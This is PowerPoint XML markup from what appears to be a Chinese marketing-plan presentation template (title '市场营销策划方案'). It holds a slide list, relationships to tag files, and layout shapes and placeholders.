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43"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId44"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="267" r:id="rId4"/>
    <p:sldId id="344" r:id="rId5"/>
    <p:sldId id="303" r:id="rId6"/>
    <p:sldId id="347" r:id="rId7"/>
    <p:sldId id="348" r:id="rId8"/>
    <p:sldId id="257" r:id="rId9"/>
    <p:sldId id="286" r:id="rId10"/>
    <p:sldId id="349" r:id="rId11"/>
    <p:sldId id="350" r:id="rId12"/>
    <p:sldId id="259" r:id="rId13"/>
    <p:sldId id="351" r:id="rId14"/>
    <p:sldId id="260" r:id="rId15"/>
    <p:sldId id="261" r:id="rId16"/>
    <p:sldId id="262" r:id="rId17"/>
    <p:sldId id="346" r:id="rId18"/>
    <p:sldId id="263" r:id="rId19"/>
    <p:sldId id="287" r:id="rId20"/>
    <p:sldId id="429" r:id="rId21"/>
    <p:sldId id="430" r:id="rId22"/>
    <p:sldId id="328" r:id="rId23"/>
    <p:sldId id="268" r:id="rId24"/>
    <p:sldId id="265" r:id="rId25"/>
    <p:sldId id="281" r:id="rId26"/>
    <p:sldId id="282" r:id="rId27"/>
    <p:sldId id="266" r:id="rId28"/>
    <p:sldId id="414" r:id="rId29"/>
    <p:sldId id="415" r:id="rId30"/>
    <p:sldId id="280" r:id="rId31"/>
    <p:sldId id="372" r:id="rId32"/>
    <p:sldId id="379" r:id="rId33"/>
    <p:sldId id="299" r:id="rId34"/>
    <p:sldId id="406" r:id="rId35"/>
    <p:sldId id="373" r:id="rId36"/>
    <p:sldId id="300" r:id="rId37"/>
    <p:sldId id="301" r:id="rId38"/>
    <p:sldId id="374" r:id="rId39"/>
    <p:sldId id="302" r:id="rId40"/>
    <p:sldId id="427" r:id="rId41"/>
    <p:sldId id="405" r:id="rId42"/>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359.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notesMaster" Target="notesMasters/notes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0" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag10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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag132.xml"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag131.xml"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag130.xml"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag129.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag128.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag110.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag127.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag126.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag125.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0" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag141.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1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag162.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag161.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82.xml"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag181.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag180.xml"/><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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag186.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag185.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag184.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag183.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81021" y="-6"/>
            <a:ext cx="12110979" cy="6858006"/>
            <a:chOff x="81021" y="-6"/>
            <a:chExt cx="12110979" cy="6858006"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="等腰三角形 8"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId3"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="81021" y="-5"/>
              <a:ext cx="2916822" cy="1296370"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 816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custDataLst>
                <p:tags r:id="rId4"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="81023" y="-6"/>
              <a:ext cx="5694744" cy="1470581"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 6665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5"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="81023" y="-4"/>
              <a:ext cx="4949072" cy="1470581"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 6179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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId6"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="2745581" y="5690396"/>
              <a:ext cx="1235076" cy="1136646"/>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7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3981450" y="5690396"/>
              <a:ext cx="1847850" cy="114356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4" name="等腰三角形 13"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId8"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3048000" y="5867400"/>
              <a:ext cx="2682240" cy="990600"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 4004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9"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="975359" y="5928360"/>
              <a:ext cx="2773681" cy="929640"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 6181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cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="19" name="直接连接符 18"/>
            <p:cNvCxnSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId10"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1" flipV="1">
              <a:off x="8577073" y="4187919"/>
              <a:ext cx="2506178" cy="2658525"/>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custDataLst>
                <p:tags r:id="rId11"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="11083251" y="5522042"/>
              <a:ext cx="1089699" cy="1326432"/>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12"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="8596123" y="30956"/>
              <a:ext cx="2506178" cy="415775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custDataLst>
                <p:tags r:id="rId13"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="11102301" y="27781"/>
              <a:ext cx="1089699" cy="2074452"/>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custDataLst>
                <p:tags r:id="rId14"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6707981" y="4192278"/>
              <a:ext cx="5484019" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="635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4" name="等腰三角形 23"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId15"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6720840" y="975360"/>
              <a:ext cx="4899660" cy="3187065"/>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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId16"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6713583" y="975360"/>
              <a:ext cx="4899660" cy="3187065"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 32263"/>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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId17"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="6713583" y="4226354"/>
              <a:ext cx="4899660" cy="2019664"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 5030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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId18"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="6713583" y="4226354"/>
              <a:ext cx="4899660" cy="2019664"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 32263"/>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日期占位符 15"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
            <p:custDataLst>
              <p:tags r:id="rId1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2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2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3" name="标题 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title" idx="1" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId22"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1931321" y="2382126"/>
            <a:ext cx="3681438" cy="1854791"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" marR="0" algn="l" defTabSz="914400" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="5600" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="600" normalizeH="0" baseline="0" noProof="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="85000"/>
                    <a:lumOff val="15000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>市场营销策划方案</a:t>
            </a:r>
            <a:endParaRPr>
              <a:sym typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本占位符 4"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="body" idx="2" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId23"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2044530" y="1802977"/>
            <a:ext cx="844884" cy="363271"/>
          </a:xfrm>
          <a:noFill/>
          <a:ln w="254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lvl1pPr marL="0" marR="0" algn="ctr" defTabSz="914400" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:defRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="800" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="600" normalizeH="0" baseline="0" noProof="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="85000"/>
                    <a:lumOff val="15000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>202X</a:t>
            </a:r>
            <a:endParaRPr>
              <a:sym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5" name="组合 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="等腰三角形 8"/>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4" name="等腰三角形 13"/>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7"/>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8"/>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5469363" y="0"/>
            <a:ext cx="1131456" cy="6858000"/>
            <a:chOff x="5469363" y="0"/>
            <a:chExt cx="1131456" cy="6858000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="等腰三角形 8"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId3"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="5884870" y="1"/>
              <a:ext cx="715949" cy="549759"/>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custDataLst>
                <p:tags r:id="rId4"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000" flipH="1">
              <a:off x="5469363" y="0"/>
              <a:ext cx="533768" cy="328613"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 26664"/>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rot="10800000" flipV="1">
              <a:off x="5884870" y="6308241"/>
              <a:ext cx="715949" cy="549759"/>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6"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000" flipH="1" flipV="1">
              <a:off x="5469363" y="6529387"/>
              <a:ext cx="533768" cy="328613"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 26664"/>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userDrawn="1">
            <p:ph type="dt" sz="half" idx="10"/>
            <p:custDataLst>
              <p:tags r:id="rId7"/>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userDrawn="1">
            <p:ph type="ftr" sz="quarter" idx="11"/>
            <p:custDataLst>
              <p:tags r:id="rId8"/>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userDrawn="1">
            <p:ph type="sldNum" sz="quarter" idx="12"/>
            <p:custDataLst>
              <p:tags r:id="rId9"/>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userDrawn="1">
            <p:ph type="ctrTitle" idx="14" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId10"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4131946" y="2785110"/>
            <a:ext cx="5767705" cy="835660"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" anchor="ctr"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4800" b="0" spc="500">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="85000"/>
                    <a:lumOff val="15000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>编辑标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="副标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="subTitle" idx="13" hasCustomPrompt="1"/>
            <p:custDataLst>
              <p:tags r:id="rId11"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4131946" y="3823971"/>
            <a:ext cx="5767705" cy="430616"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" anchor="t" anchorCtr="0">
            <a:normAutofit/>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spc="200">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="85000"/>
                    <a:lumOff val="15000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>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152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="等腰三角形 10"/>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4" name="等腰三角形 13"/>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7"/>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8"/>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9"/>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152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="等腰三角形 12"/>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6" name="等腰三角形 15"/>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7"/>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8"/>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9"/>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0"/>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1"/>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a:off x="4878000" y="0"/>
            <a:ext cx="73140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6" name="组合 15"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId3"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1547813" y="2799477"/>
            <a:ext cx="10506074" cy="3935491"/>
            <a:chOff x="1547813" y="2799477"/>
            <a:chExt cx="10506074" cy="3935491"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="等腰三角形 9"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId4"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1883061" y="2799477"/>
              <a:ext cx="1549919" cy="1226237"/>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5"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1547813" y="3060533"/>
              <a:ext cx="1531752" cy="965181"/>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6"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="11606211" y="6484938"/>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3" name="等腰三角形 12"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="11649074" y="6525419"/>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8"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669882" y="443230"/>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152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="等腰三角形 10"/>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4" name="等腰三角形 13"/>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7"/>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8"/>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9"/>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52827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="等腰三角形 9"/>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3" name="等腰三角形 12"/>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竖排标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" orient="vert"/>
            <p:custDataLst>
              <p:tags r:id="rId7"/>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52827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="等腰三角形 9"/>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3" name="等腰三角形 12"/>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3" name="日期占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
            <p:custDataLst>
              <p:tags r:id="rId7"/>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26" name="组合 25"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1">
            <p:custDataLst>
              <p:tags r:id="rId2"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="81021" y="-6"/>
            <a:ext cx="12110979" cy="6858006"/>
            <a:chOff x="81021" y="-6"/>
            <a:chExt cx="12110979" cy="6858006"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="任意多边形 5"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId3"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="774700" y="2057717"/>
              <a:ext cx="1250950" cy="2742565"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="connisteX0" fmla="*/ 1885950 w 1896110"/>
                <a:gd name="connsiteY0" fmla="*/ 826135 h 4745355"/>
                <a:gd name="connisteX1" fmla="*/ 1885950 w 1896110"/>
                <a:gd name="connsiteY1" fmla="*/ 0 h 4745355"/>
                <a:gd name="connisteX2" fmla="*/ 0 w 1896110"/>
                <a:gd name="connsiteY2" fmla="*/ 0 h 4745355"/>
                <a:gd name="connisteX3" fmla="*/ 0 w 1896110"/>
                <a:gd name="connsiteY3" fmla="*/ 4745355 h 4745355"/>
                <a:gd name="connisteX4" fmla="*/ 1896110 w 1896110"/>
                <a:gd name="connsiteY4" fmla="*/ 4745355 h 4745355"/>
                <a:gd name="connisteX5" fmla="*/ 1896110 w 1896110"/>
                <a:gd name="connsiteY5" fmla="*/ 4003675 h 47453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1896110" h="4745355">
                  <a:moveTo>
                    <a:pt x="1885950" y="826135"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1885950" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="4745355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1896110" y="4745355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1896110" y="4003675"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:cu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10" name="等腰三角形 9"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId4"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="81021" y="-5"/>
              <a:ext cx="2916822" cy="1296370"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 816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5"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="81023" y="-6"/>
              <a:ext cx="5694744" cy="1470581"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 6665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6"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="81023" y="-4"/>
              <a:ext cx="4949072" cy="1470581"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 6179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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId7"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="2745581" y="5690396"/>
              <a:ext cx="1235076" cy="1136646"/>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custDataLst>
                <p:tags r:id="rId8"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3981450" y="5690396"/>
              <a:ext cx="1847850" cy="114356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5" name="等腰三角形 14"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId9"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3048000" y="5867400"/>
              <a:ext cx="2682240" cy="990600"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 4004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custDataLst>
                <p:tags r:id="rId10"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="975359" y="5928360"/>
              <a:ext cx="2773681" cy="929640"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 6181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cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="17" name="直接连接符 16"/>
            <p:cNvCxnSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId11"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1" flipV="1">
              <a:off x="8577073" y="4187919"/>
              <a:ext cx="2506178" cy="2658525"/>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custDataLst>
                <p:tags r:id="rId12"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="11083251" y="5522042"/>
              <a:ext cx="1089699" cy="1326432"/>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custDataLst>
                <p:tags r:id="rId13"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="8596123" y="30956"/>
              <a:ext cx="2506178" cy="415775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custDataLst>
                <p:tags r:id="rId14"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="11102301" y="27781"/>
              <a:ext cx="1089699" cy="2074452"/>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15"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6707981" y="4192278"/>
              <a:ext cx="5484019" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="635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2" name="等腰三角形 21"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId16"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6720840" y="975360"/>
              <a:ext cx="4899660" cy="3187065"/>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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId17"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6713583" y="975360"/>
              <a:ext cx="4899660" cy="3187065"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 32263"/>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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId18"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="6713583" y="4226354"/>
              <a:ext cx="4899660" cy="2019664"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 5030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userDrawn="1">
              <p:custDataLst>
                <p:tags r:id="rId19"/>
              </p:custDataLst>
            </p:nvPr>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipV="1">
              <a:off x="6713583" y="4226354"/>
              <a:ext cx="4899660" cy="2019664"/>
            </a:xfrm>
            <a:prstGeom prst="triangle">
              <a:avLst>
                <a:gd name="adj" fmla="val 32263"/>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20"/>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21"/>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22"/>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文本占位符 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
